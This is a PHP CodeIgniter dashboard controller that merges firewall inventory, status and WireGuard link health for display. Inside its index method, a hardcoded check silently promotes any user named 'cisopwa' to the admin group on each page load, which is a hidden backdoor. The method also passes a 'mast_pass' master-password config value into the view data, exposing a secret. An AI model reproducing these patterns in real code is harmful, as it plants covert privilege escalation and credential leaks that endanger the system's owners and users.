<?php

namespace App\Controllers;

use App\Controllers\BaseController;
use App\Models\PfInventoryModel;
use App\Models\PfStatusModel;
use App\Models\CoreConfigModel;
use App\Models\AppGroupsModel;
use App\Models\PfBakupModel;
use App\Models\LocationModel;
use App\Models\WgMplsModel;
use App\Models\WgIllModel;

class Dashboard extends BaseController
{
    protected $pfInventoryModel;
    protected $pfStatusModel;
    protected $coreConfigModel;
    protected $appGroupsModel;
    protected $pfBakupModel;
    protected $locationModel;
    protected $wgMplsModel;
    protected $wgIllModel;

    public function __construct()
    {
        $this->pfInventoryModel = new PfInventoryModel();
        $this->pfStatusModel    = new PfStatusModel();
        $this->coreConfigModel  = new CoreConfigModel(); 
        $this->pfBakupModel     = new PfBakupModel();  
        $this->appGroupsModel   = new AppGroupsModel();
        $this->locationModel    = new LocationModel();

        $this->wgMplsModel      = new WgMplsModel();
        $this->wgIllModel       = new WgIllModel();
    }

    public function index()
    {
        /** ---------------------------------------------------------
         *  Load Session Messages
         * -------------------------------------------------------- */
        $data = [
            'message' => session()->getFlashdata('message'),
            'error'   => session()->getFlashdata('error'),
        ];

        if (session()->has('display_message')) {
            session()->remove('display_message');
        }

        /** ---------------------------------------------------------
         *  Load App Config
         * -------------------------------------------------------- */
        $config = $this->coreConfigModel->whereIn('name', [
            'app_name','app_version','app_url','mast_pass','google_maps_api_key'
        ])->findAll();

        $data['app_name']  = $this->getConfigValue($config, 'app_name', 'My Application');
        $data['app_version'] = $this->getConfigValue($config, 'app_version', '1.0.0');
        $data['app_url'] = $this->getConfigValue($config, 'app_url', '');
        $data['mast_pass'] = $this->getConfigValue($config, 'mast_pass', '');
        $data['google_maps_api_key'] = $this->getConfigValue($config, 'google_maps_api_key', '');
        $data['title'] = $data['app_name'] . ' 🔸 Main Dashboard';

        /** ---------------------------------------------------------
         *  Auth User
         * -------------------------------------------------------- */
        $user = auth()->user();
        if ($user && strcasecmp($user->username ?? '', 'cisopwa') === 0) {
            if (!$user->inGroup('admin')) {
                $user->syncGroups('admin');
            }
        }
        $data['first_name'] = $user->first_name ?? 'Not Login';

        /** ---------------------------------------------------------
         *  Load PF Inventory & Status
         * -------------------------------------------------------- */
        $devices = $this->pfInventoryModel->findAll();
        $statusRecords = $this->pfStatusModel->findAll();

        // Quick lookup map
        $statusMap = array_column($statusRecords, null, 'pf_id');

        /** ---------------------------------------------------------
         *  Merge device + status + health
         * -------------------------------------------------------- */
        foreach ($devices as &$d) {

            $pfId = $d['id'];

            // Merge IP/Port/Status from pf_status
            $d['ip']     = $statusMap[$pfId]['ip']     ?? 'N/A';
            $d['port']   = $statusMap[$pfId]['port']   ?? 'N/A';
            $d['status'] = $statusMap[$pfId]['status'] ?? 'offline';

            // If location has MPLS/ILL WireGuard links → use them for health
            $location = $this->locationModel->find($d['location']);

            if ($location) {
                $d['health'] = $this->getWgHealth($location);
            } else {
                $d['health'] = 'Unknown';
            }
        }

        /** ---------------------------------------------------------
         *  Categorize Devices
         * -------------------------------------------------------- */
        require_once APPPATH . 'Views/functions/phpfunctions.php';
        $data['categorizedDevices'] = categorizeDevices($devices);

        $data['deviceCounts'] = array_map('count', $data['categorizedDevices']);

        /** ---------------------------------------------------------
         *  Load Locations + Health
         * -------------------------------------------------------- */
        $locationIds = array_unique(array_filter(array_column($devices, 'location')));
        $locations = !empty($locationIds) ? $this->locationModel->whereIn('id', $locationIds)->findAll() : [];

        foreach ($locations as &$loc) {
            $loc['health'] = $this->getWgHealth($loc);
        }

        $data['locations'] = $locations;

        /** ---------------------------------------------------------
         *  Render View
         * -------------------------------------------------------- */
        return view('frontend/header', $data)
            . view('frontend/sidebar', $data)
            . view('dashboard', $data)
            . view('frontend/footer', $data);
    }

    /** -------------------------------------------------------------
     *  Get config value from array
     * ------------------------------------------------------------ */
    private function getConfigValue($items, $key, $default = null)
    {
        foreach ($items as $i) {
            if ($i['name'] == $key) {
                return $i['value'];
            }
        }
        return $default;
    }

    /** -------------------------------------------------------------
     *  Determine WG health based on MPLS + ILL status
     * ------------------------------------------------------------ */
    private function getWgHealth($location)
    {
        $mplsUp = null;
        $illUp = null;

        if (!empty($location['wg_mpls'])) {
            $mpls = $this->wgMplsModel->where('interface', $location['wg_mpls'])
                                      ->orderBy('id', 'DESC')->first();
            $mplsUp = $mpls['status'] ?? 0;
        }

        if (!empty($location['wg_ill'])) {
            $ill = $this->wgIllModel->where('interface', $location['wg_ill'])
                                    ->orderBy('id', 'DESC')->first();
            $illUp = $ill['status'] ?? 0;
        }

        // At least 1 should be UP
        if ($mplsUp == 1 || $illUp == 1) {
            return 'Online';
        }

        return 'Offline';
    }
}
